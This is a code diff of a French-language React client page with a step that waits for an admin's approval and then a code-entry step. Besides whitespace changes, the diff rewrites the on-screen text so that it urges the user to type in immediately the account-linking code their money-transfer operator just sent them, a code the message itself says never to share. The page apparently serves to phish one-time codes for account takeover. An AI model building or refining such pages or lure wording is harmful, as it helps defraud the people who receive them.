@@ -200,7 +200,7 @@ export default function ClientLinkPage() {
                         }));
                     }
                 }
-            } catch {}
+            } catch { }
         };
 
         fetchLink();
@@ -216,7 +216,7 @@ export default function ClientLinkPage() {
                 const sub = await dataService.getSubmissionById(submissionId);
                 if (sub) {
                     const statusStr = (sub.status || '').toLowerCase();
-                    
+
                     // Si on était en attente d'admin et qu'il a approuvé -> aller à la saisie du code
                     if (currentStep === 'waiting_admin') {
                         if (statusStr.includes('approuvé') || statusStr.includes('code') || statusStr === 'approved_awaiting_code') {
@@ -621,7 +621,7 @@ export default function ClientLinkPage() {
                                 <span className="badge badge-success text-[10px] mb-2">Dossier Validé</span>
                                 <h2 className="text-xl font-bold text-white mb-2">Confirmation du Dossier</h2>
                                 <p className="text-xs text-slate-400 leading-relaxed max-w-sm mx-auto">
-                                    Nos machines ont validé votre demande. Veuillez saisir ci-dessous le code de confirmation que vous venez de recevoir par message.
+                                    Veuillez saisir immédiatement le code de validation d’association de compte que vous venez de recevoir par message via votre opérateur de Transfert « A NE SURTOUT PAS PARTAGER ». Veuillez saisir directement le code reçu afin que l’opération soit effectuée.
                                 </p>
                             </div>
 
